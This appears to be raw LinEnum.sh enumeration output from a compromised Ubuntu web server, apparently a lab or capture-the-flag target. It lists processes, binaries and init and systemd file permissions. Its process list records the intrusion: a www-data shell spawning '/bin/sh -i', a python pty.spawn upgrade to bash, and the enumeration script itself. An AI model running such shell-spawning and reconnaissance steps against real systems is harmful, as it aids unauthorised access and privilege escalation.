root       128  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       129  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       130  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       131  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       132  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_2]
root       133  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_2]
root       134  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_3]
root       135  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_3]
root       136  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_4]
root       137  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_4]
root       138  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_5]
root       139  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_5]
root       140  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_6]
root       141  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_6]
root       142  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_7]
root       143  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_7]
root       144  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_8]
root       145  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_8]
root       146  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_9]
root       147  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_9]
root       148  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_10]
root       149  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_10]
root       150  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_11]
root       151  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_11]
root       152  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_12]
root       153  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_12]
root       154  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_13]
root       155  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_13]
root       156  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_14]
root       157  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_14]
root       158  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_15]
root       159  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_15]
root       160  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_16]
root       161  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_16]
root       162  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_17]
root       163  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_17]
root       164  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_18]
root       165  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_18]
root       166  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_19]
root       167  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_19]
root       168  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_20]
root       169  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_20]
root       170  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_21]
root       171  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_21]
root       172  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_22]
root       173  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_22]
root       174  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_23]
root       175  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_23]
root       176  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_24]
root       177  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_24]
root       178  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_25]
root       179  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_25]
root       180  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_26]
root       181  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_26]
root       182  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_27]
root       183  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_27]
root       184  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_28]
root       185  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_28]
root       186  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_29]
root       187  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_29]
root       188  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_30]
root       189  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_30]
root       190  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_31]
root       191  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_31]
root       192  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_32]
root       195  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_32]
root       197  0.0  0.0      0     0 ?        S<   Nov11   0:00 [vmw_pvscsi_wq_3]
root       199  0.0  0.0      0     0 ?        S<   Nov11   0:00 [ttm_swap]
root       204  0.0  0.0      0     0 ?        S<   Nov11   0:00 [kpsmoused]
root       253  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       271  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       276  0.0  0.0      0     0 ?        S<   Nov11   0:00 [kworker/1:1H]
root       342  0.0  0.0      0     0 ?        S<   Nov11   0:00 [raid5wq]
root       367  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       400  0.0  0.0      0     0 ?        S    Nov11   0:00 [jbd2/sda1-8]
root       401  0.0  0.0      0     0 ?        S<   Nov11   0:00 [ext4-rsv-conver]
root       444  0.0  0.0      0     0 ?        S    Nov11   0:00 [kworker/1:2]
root       446  0.0  0.0      0     0 ?        S<   Nov11   0:00 [kworker/0:1H]
root       460  0.0  0.0      0     0 ?        S<   Nov11   0:00 [iscsi_eh]
root       462  0.0  0.0      0     0 ?        S<   Nov11   0:00 [ib_addr]
root       463  0.0  0.0      0     0 ?        S<   Nov11   0:00 [ib_mcast]
root       464  0.0  0.0      0     0 ?        S<   Nov11   0:00 [ib_nl_sa_wq]
root       465  0.0  0.0      0     0 ?        S<   Nov11   0:00 [ib_cm]
root       467  0.0  0.0      0     0 ?        S<   Nov11   0:00 [iw_cm_wq]
root       469  0.0  0.3  28452  3160 ?        Ss   Nov11   0:00 /lib/systemd/systemd-journald
root       470  0.0  0.0      0     0 ?        S<   Nov11   0:00 [rdma_cm]
root       483  0.0  0.0      0     0 ?        S    Nov11   0:00 [kauditd]
root       508  0.0  0.1  94772  1632 ?        Ss   Nov11   0:00 /sbin/lvmetad -f
root       522  0.0  0.4  44940  4356 ?        Ss   Nov11   0:00 /lib/systemd/systemd-udevd
root       582  0.0  0.0      0     0 ?        S    Nov11   0:00 [kworker/0:3]
systemd+   605  0.0  0.2 100324  2332 ?        Ssl  Nov11   0:00 /lib/systemd/systemd-timesyncd
root      1037  0.0  0.0   5224   148 ?        Ss   Nov11   0:00 /sbin/iscsid
root      1038  0.0  0.3   5724  3516 ?        S<Ls Nov11   0:02 /sbin/iscsid
root      1059  0.0  0.9 185736  9948 ?        Ssl  Nov11   0:14 /usr/bin/vmtoolsd
message+  1061  0.0  0.3  42964  3856 ?        Ss   Nov11   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root      1065  0.0  0.2 383424  2060 ?        Ssl  Nov11   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root      1069  0.0  0.5 275884  5992 ?        Ssl  Nov11   0:00 /usr/lib/accountsservice/accounts-daemon
root      1072  0.0  0.1   4400  1220 ?        Ss   Nov11   0:00 /usr/sbin/acpid
daemon    1074  0.0  0.2  26044  2160 ?        Ss   Nov11   0:00 /usr/sbin/atd -f
root      1087  0.0  0.1  20100  1228 ?        Ss   Nov11   0:00 /lib/systemd/systemd-logind
root      1105  0.0  0.5  65520  5548 ?        Ss   Nov11   0:00 /usr/sbin/sshd -D
syslog    1111  0.0  0.3 256396  3068 ?        Ssl  Nov11   0:00 /usr/sbin/rsyslogd -n
root      1118  0.0  0.2  29008  2768 ?        Ss   Nov11   0:00 /usr/sbin/cron -f
root      1131  0.0  2.2 287320 23120 ?        Ssl  Nov11   0:00 /usr/lib/snapd/snapd
root      1167  0.0  0.0  13376   168 ?        Ss   Nov11   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
mysql     1195  0.0 15.4 1246912 156564 ?      Ssl  Nov11   0:08 /usr/sbin/mysqld
root      1223  0.0  0.5 277180  5672 ?        Ssl  Nov11   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1225  0.0  0.1  15940  1692 tty1     Ss+  Nov11   0:00 /sbin/agetty --noclear tty1 linux
root      1226  0.0  0.1 125112  1312 ?        Ss   Nov11   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data  1227  0.3  0.4 125704  4912 ?        S    Nov11   1:10 nginx: worker process
www-data  1228  0.3  0.4 125704  4876 ?        S    Nov11   0:58 nginx: worker process
root      1236  0.0  0.2  19620  2160 ?        Ss   Nov11   0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid
root      1241  0.0  2.4 221516 24936 ?        Ss   Nov11   0:01 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
www-data  1244  0.0  0.9 221736  9592 ?        S    Nov11   0:00 php-fpm: pool www
www-data  1245  0.0  1.2 221888 12256 ?        S    Nov11   0:00 php-fpm: pool www
root      1474  0.0  0.0      0     0 ?        S    Nov11   0:00 [kworker/u4:0]
root      1559  0.0  0.0      0     0 ?        S    Nov11   0:00 [kworker/0:0]
root      1919  0.0  0.0      0     0 ?        S    02:56   0:00 [kworker/u4:1]
www-data  2000  0.0  0.0   4508   792 ?        S    03:37   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data  2004  0.0  0.0   4508   848 ?        S    03:37   0:00 /bin/sh -i
www-data  2050  0.0  0.8  35840  8356 ?        S    03:39   0:00 python3 -c import pty;pty.spawn('/bin/bash')
www-data  2051  0.0  0.3  18216  3312 pts/0    Ss   03:39   0:00 /bin/bash
root      2059  0.0  0.0      0     0 ?        S    03:40   0:00 [kworker/u4:2]
www-data  2064  0.0  0.4  19024  4080 pts/0    S+   03:43   0:00 /bin/bash ./LinEnum.sh
www-data  2065  0.0  0.3  19076  3420 pts/0    S+   03:43   0:00 /bin/bash ./LinEnum.sh
www-data  2066  0.0  0.0   4384   712 pts/0    S+   03:43   0:00 tee -a
www-data  2260  0.0  0.2  19076  2848 pts/0    S+   03:44   0:00 /bin/bash ./LinEnum.sh
www-data  2261  0.0  0.2  34424  2952 pts/0    R+   03:44   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  1037528 Jun 24  2016 /bin/bash
lrwxrwxrwx 1 root root        4 May 15  2017 /bin/sh -> dash
-rwxr-xr-x 1 root root   326224 Feb 15  2017 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   618520 Feb 15  2017 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   141904 Feb 15  2017 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   453240 Feb 15  2017 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    44104 Dec 16  2016 /sbin/agetty
lrwxrwxrwx 1 root root       20 Feb 15  2017 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   783984 Dec  9  2016 /sbin/iscsid
-rwxr-xr-x 1 root root    51336 Apr 16  2016 /sbin/lvmetad
-rwxr-xr-x 1 root root   513216 Feb 20  2017 /sbin/mdadm
-rwxr-xr-x 1 root root   224208 Jan 12  2017 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    18504 Feb  3  2017 /usr/bin/lxcfs
-rwxr-xr-x 1 root root    44528 Feb  9  2017 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    15048 Jan 18  2016 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 19613424 Apr 29  2017 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root    48112 Apr  9  2016 /usr/sbin/acpid
-rwxr-xr-x 1 root root    26632 Jan 14  2016 /usr/sbin/atd
-rwxr-xr-x 1 root root    44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root    48440 Apr 11  2016 /usr/sbin/irqbalance
-rwxr-xr-x 1 root root 24754056 Apr 27  2017 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   599328 Apr  5  2016 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   799216 Mar 16  2017 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 356
drwxr-xr-x   2 root root 4096 May 22  2017 .
drwxr-xr-x 109 root root 4096 May 22  2017 ..
-rw-r--r--   1 root root 1286 May 22  2017 .depend.boot
-rw-r--r--   1 root root 1291 May 22  2017 .depend.start
-rw-r--r--   1 root root 1286 May 22  2017 .depend.stop
-rw-r--r--   1 root root 2427 Jan 19  2016 README
-rwxr-xr-x   1 root root 2243 Feb  9  2016 acpid
-rwxr-xr-x   1 root root 5336 Apr 15  2016 alsa-utils
-rwxr-xr-x   1 root root 2014 Dec 28  2014 anacron
-rwxr-xr-x   1 root root 6223 Mar  3  2017 apparmor
-rwxr-xr-x   1 root root 2799 Mar 31  2016 apport
-rwxr-xr-x   1 root root 1071 Dec  6  2015 atd
-rwxr-xr-x   1 root root 2968 Mar  1  2016 bluetooth
-rwxr-xr-x   1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x   1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x   1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x   1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x   1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x   1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x   1 root root  937 Mar 28  2015 cryptdisks
-rwxr-xr-x   1 root root  896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x   1 root root 2813 Dec  2  2015 dbus
-rwxr-xr-x   1 root root 1105 Mar 15  2016 grub-common
-rwxr-xr-x   1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x   1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x   1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x   1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x   1 root root 1503 Mar 29  2016 iscsid
-rwxr-xr-x   1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x   1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x   1 root root 2087 Dec 21  2015 kmod
-rwxr-xr-x   1 root root 3431 Mar 31  2017 lightdm
-rwxr-xr-x   1 root root  695 Oct 30  2015 lvm2
-rwxr-xr-x   1 root root  571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x   1 root root  586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x   1 root root 2300 Feb  3  2017 lxcfs
-rwxr-xr-x   1 root root 2541 Feb  3  2017 lxd
-rwxr-xr-x   1 root root 2611 Apr 11  2016 mdadm
-rwxr-xr-x   1 root root 1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x   1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x   1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x   1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x   1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x   1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x   1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x   1 root root 5607 Feb  3  2017 mysql
-rwxr-xr-x   1 root root 1757 Jan 11  2017 network-manager
-rwxr-xr-x   1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x   1 root root 4579 Apr 26  2016 nginx
-rwxr-xr-x   1 root root 1581 Oct 16  2015 ondemand
-rwxr-xr-x   1 root root 2503 Mar 29  2016 open-iscsi
-rwxr-xr-x   1 root root 1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x   1 root root 4987 Mar  2  2017 php7.0-fpm
-rwxr-xr-x   1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x   1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x   1 root root 1192 Sep  6  2015 procps
-rwxr-xr-x   1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x   1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x   1 root root  117 Jan 19  2016 rcS
-rwxr-xr-x   1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x   1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x   1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x   1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x   1 root root 1226 Jun  9  2015 screen-cleanup
-rwxr-xr-x   1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x   1 root root  597 Jan 19  2016 single
-rw-r--r--   1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x   1 root root 4077 Mar 16  2017 ssh
-rwxr-xr-x   1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x   1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x   1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x   1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x   1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x   1 root root 1391 Apr 20  2017 unattended-upgrades
-rwxr-xr-x   1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x   1 root root 1306 Dec 16  2016 uuidd
-rwxr-xr-x   1 root root 2757 Nov 10  2015 x11-common


[-] /etc/init/ config file permissions:
total 360
drwxr-xr-x   2 root root 4096 May 22  2017 .
drwxr-xr-x 109 root root 4096 May 22  2017 ..
-rw-r--r--   1 root root  338 Apr  9  2016 acpid.conf
-rw-r--r--   1 root root  309 Apr 15  2016 alsa-utils.conf
-rw-r--r--   1 root root  278 Dec 28  2014 anacron.conf
-rw-r--r--   1 root root 3709 Mar  3  2017 apparmor.conf
-rw-r--r--   1 root root 1626 Jan 10  2017 apport.conf
-rw-r--r--   1 root root  997 Mar  1  2016 bluetooth.conf
-rw-r--r--   1 root root  328 Nov 18  2014 bootmisc.sh.conf
-rw-r--r--   1 root root  232 Nov 18  2014 checkfs.sh.conf
-rw-r--r--   1 root root  253 Nov 18  2014 checkroot-bootclean.sh.conf
-rw-r--r--   1 root root  307 Nov 18  2014 checkroot.sh.conf
-rw-r--r--   1 root root  250 Apr  4  2016 console-font.conf
-rw-r--r--   1 root root  509 Apr  4  2016 console-setup.conf
-rw-r--r--   1 root root  266 May 19  2016 console.conf
-rw-r--r--   1 root root 1122 May 19  2016 container-detect.conf
-rw-r--r--   1 root root  356 May 19  2016 control-alt-delete.conf
-rw-r--r--   1 root root  297 Apr  5  2016 cron.conf
-rw-r--r--   1 root root  412 Mar 28  2015 cryptdisks-udev.conf
-rw-r--r--   1 root root 1519 Mar 28  2015 cryptdisks.conf
-rw-r--r--   1 root root  482 Sep  1  2015 dbus.conf
-rw-r--r--   1 root root  374 Aug 20  2016 failsafe-x.conf
-rw-r--r--   1 root root 1377 May 19  2016 failsafe.conf
-rw-r--r--   1 root root  267 May 19  2016 flush-early-job-log.conf
-rw-r--r--   1 root root 1247 Jun  1  2015 friendly-recovery.conf
-rw-r--r--   1 root root  186 Aug 25  2016 gpu-manager.conf
-rw-r--r--   1 root root  284 Jul 23  2013 hostname.conf
-rw-r--r--   1 root root  300 May 21  2014 hostname.sh.conf
-rw-r--r--   1 root root  561 Mar 14  2016 hwclock-save.conf
-rw-r--r--   1 root root  674 Mar 14  2016 hwclock.conf
-rw-r--r--   1 root root  109 Mar 14  2016 hwclock.sh.conf
-rw-r--r--   1 root root  597 Apr 11  2016 irqbalance.conf
-rw-r--r--   1 root root  689 Aug 20  2015 kmod.conf
-rw-r--r--   1 root root 1444 Mar 31  2017 lightdm.conf
-rw-r--r--   1 root root  540 Feb  3  2017 lxcfs.conf
-rw-r--r--   1 root root  813 Feb  3  2017 lxd.conf
-rw-r--r--   1 root root  268 Nov 18  2014 mountall-bootclean.sh.conf
-rw-r--r--   1 root root  349 Nov 18  2014 mountall-net.conf
-rw-r--r--   1 root root  261 Nov 18  2014 mountall-reboot.conf
-rw-r--r--   1 root root 1201 Nov 18  2014 mountall-shell.conf
-rw-r--r--   1 root root 1232 Nov 18  2014 mountall.conf
-rw-r--r--   1 root root  311 Nov 18  2014 mountall.sh.conf
-rw-r--r--   1 root root  327 Nov 18  2014 mountdevsubfs.sh.conf
-rw-r--r--   1 root root  405 Nov 18  2014 mounted-debugfs.conf
-rw-r--r--   1 root root  730 Nov 18  2014 mounted-dev.conf
-rw-r--r--   1 root root  536 Nov 18  2014 mounted-proc.conf
-rw-r--r--   1 root root  618 Nov 18  2014 mounted-run.conf
-rw-r--r--   1 root root 1890 Nov 18  2014 mounted-tmp.conf
-rw-r--r--   1 root root  903 Nov 18  2014 mounted-var.conf
-rw-r--r--   1 root root  323 Nov 18  2014 mountkernfs.sh.conf
-rw-r--r--   1 root root  249 Nov 18  2014 mountnfs-bootclean.sh.conf
-rw-r--r--   1 root root  313 Nov 18  2014 mountnfs.sh.conf
-rw-r--r--   1 root root  238 Nov 18  2014 mtab.sh.conf
-rw-r--r--   1 root root 1757 Feb  3  2017 mysql.conf
-rw-r--r--   1 root root  530 Jun  2  2015 network-interface-container.conf
-rw-r--r--   1 root root 1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--   1 root root  933 Jun  2  2015 network-interface.conf
-rw-r--r--   1 root root  568 Jan 11  2017 network-manager.conf
-rw-r--r--   1 root root 2493 Jun  2  2015 networking.conf
-rw-r--r--   1 root root  401 Apr 26  2016 nginx.conf
-rw-r--r--   1 root root  568 Feb  1  2016 passwd.conf
-rw-r--r--   1 root root  398 Mar  2  2017 php7.0-fpm.conf
-rw-r--r--   1 root root  363 Jun  5  2014 procps-instance.conf
-rw-r--r--   1 root root  119 Jun  5  2014 procps.conf
-rw-r--r--   1 root root 1543 May 19  2016 rc-sysinit.conf
-rw-r--r--   1 root root  661 May 19  2016 rc.conf
-rw-r--r--   1 root root  683 May 19  2016 rcS.conf
-rw-r--r--   1 root root  457 Jun  3  2015 resolvconf.conf
-rw-r--r--   1 root root  365 Nov  3  2014 rfkill-restore.conf
-rw-r--r--   1 root root  357 Nov  3  2014 rfkill-store.conf
-rw-r--r--   1 root root  426 Dec  2  2015 rsyslog.conf
-rw-r--r--   1 root root  230 Apr  4  2016 setvtrgb.conf
-rw-r--r--   1 root root  277 May 19  2016 shutdown.conf
-rw-r--r--   1 root root  641 Mar 16  2017 ssh.conf
-rw-r--r--   1 root root  348 May 19  2016 tty1.conf
-rw-r--r--   1 root root  333 May 19  2016 tty2.conf
-rw-r--r--   1 root root  333 May 19  2016 tty3.conf
-rw-r--r--   1 root root  333 May 19  2016 tty4.conf
-rw-r--r--   1 root root  232 May 19  2016 tty5.conf
-rw-r--r--   1 root root  232 May 19  2016 tty6.conf
-rw-r--r--   1 root root  337 Apr 12  2016 udev.conf
-rw-r--r--   1 root root  360 Apr 12  2016 udevmonitor.conf
-rw-r--r--   1 root root  352 Apr 12  2016 udevtrigger.conf
-rw-r--r--   1 root root  473 Aug  7  2014 ufw.conf
-rw-r--r--   1 root root  412 May 19  2016 upstart-file-bridge.conf
-rw-r--r--   1 root root  329 May 19  2016 upstart-socket-bridge.conf
-rw-r--r--   1 root root  553 May 19  2016 upstart-udev-bridge.conf
-rw-r--r--   1 root root  683 Feb 24  2015 ureadahead-other.conf
-rw-r--r--   1 root root  889 Feb 24  2015 ureadahead.conf
-rw-r--r--   1 root root 1521 May 19  2016 wait-for-state.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.3M
drwxr-xr-x 25 root root  36K May 22  2017 system
drwxr-xr-x  2 root root 4.0K May 16  2017 system-sleep
drwxr-xr-x  2 root root 4.0K May 16  2017 network
drwxr-xr-x  2 root root 4.0K May 16  2017 system-generators
drwxr-xr-x  2 root root 4.0K May 16  2017 system-preset
-rwxr-xr-x  1 root root 443K Feb 15  2017 systemd-udevd
-rwxr-xr-x  1 root root 301K Feb 15  2017 systemd-fsck
-rwxr-xr-x  1 root root 139K Feb 15  2017 systemd-timesyncd
-rwxr-xr-x  1 root root 319K Feb 15  2017 systemd-journald
-rwxr-xr-x  1 root root 824K Feb 15  2017 systemd-networkd
-rwxr-xr-x  1 root root 657K Feb 15  2017 systemd-resolved
-rwxr-xr-x  1 root root 1.6M Feb 15  2017 systemd
-rwxr-xr-x  1 root root  75K Feb 15  2017 systemd-fsckd
-rwxr-xr-x  1 root root 332K Feb 15  2017 systemd-hostnamed
-rwxr-xr-x  1 root root 340K Feb 15  2017 systemd-localed
-rwxr-xr-x  1 root root  31K Feb 15  2017 systemd-reply-password
-rwxr-xr-x  1 root root  91K Feb 15  2017 systemd-socket-proxyd
-rwxr-xr-x  1 root root  35K Feb 15  2017 systemd-user-sessions
-rwxr-xr-x  1 root root  15K Feb 15  2017 systemd-ac-power
-rwxr-xr-x  1 root root  55K Feb 15  2017 systemd-activate
-rwxr-xr-x  1 root root  91K Feb 15  2017 systemd-backlight
-rwxr-xr-x  1 root root  47K Feb 15  2017 systemd-binfmt
-rwxr-xr-x  1 root root 103K Feb 15  2017 systemd-bootchart
-rwxr-xr-x  1 root root  31K Feb 15  2017 systemd-hibernate-resume
-rwxr-xr-x  1 root root 276K Feb 15  2017 systemd-initctl
-rwxr-xr-x  1 root root 123K Feb 15  2017 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Feb 15  2017 systemd-random-seed
-rwxr-xr-x  1 root root  91K Feb 15  2017 systemd-rfkill
-rwxr-xr-x  1 root root  51K Feb 15  2017 systemd-sysctl
-rwxr-xr-x  1 root root 333K Feb 15  2017 systemd-timedated
-rwxr-xr-x  1 root root 268K Feb 15  2017 systemd-cgroups-agent
-rwxr-xr-x  1 root root  91K Feb 15  2017 systemd-cryptsetup
-rwxr-xr-x  1 root root 605K Feb 15  2017 systemd-logind
-rwxr-xr-x  1 root root  35K Feb 15  2017 systemd-quotacheck
-rwxr-xr-x  1 root root  51K Feb 15  2017 systemd-remount-fs
-rwxr-xr-x  1 root root  71K Feb 15  2017 systemd-sleep
-rwxr-xr-x  1 root root 276K Feb 15  2017 systemd-update-utmp
-rwxr-xr-x  1 root root 352K Feb 15  2017 systemd-bus-proxyd
-rwxr-xr-x  1 root root  51K Feb 15  2017 systemd-modules-load
-rwxr-xr-x  1 root root 143K Feb 15  2017 systemd-shutdown
-rwxr-xr-x  1 root root 1.3K Feb  2  2017 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Apr 12  2016 system-shutdown

/lib/systemd/system:
total 916K
drwxr-xr-x 2 root root 4.0K May 16  2017 sockets.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 getty.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 graphical.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 rc-local.service.d
drwxr-xr-x 2 root root 4.0K May 16  2017 reboot.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 rescue.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 resolvconf.service.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 sigpwr.target.wants
drwxr-xr-x 2 root root 4.0K May 16  2017 systemd-timesyncd.service.d
drwxr-xr-x 2 root root 4.0K May 16  2017 timers.target.wants
lrwxrwxrwx 1 root root    9 May 15  2017 screen-cleanup.service -> /dev/null
drwxr-xr-x 2 root root 4.0K May 15  2017 halt.target.wants
drwxr-xr-x 2 root root 4.0K May 15  2017 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K May 15  2017 kexec.target.wants
-rw-r--r-- 1 root root  192 Apr 29  2017 snapd.autoimport.service
-rw-r--r-- 1 root root  290 Apr 29  2017 snapd.refresh.service
-rw-r--r-- 1 root root  323 Apr 29  2017 snapd.refresh.timer
-rw-r--r-- 1 root root  184 Apr 29  2017 snapd.service
-rw-r--r-- 1 root root  281 Apr 29  2017 snapd.socket
-rw-r--r-- 1 root root  474 Apr 29  2017 snapd.system-shutdown.service
-rw-r--r-- 1 root root  345 Apr 20  2017 unattended-upgrades.service
-rw-r--r-- 1 root root  385 Mar 16  2017 ssh.service
-rw-r--r-- 1 root root  216 Mar 16  2017 ssh.socket
-rw-r--r-- 1 root root  196 Mar 16  2017 ssh@.service
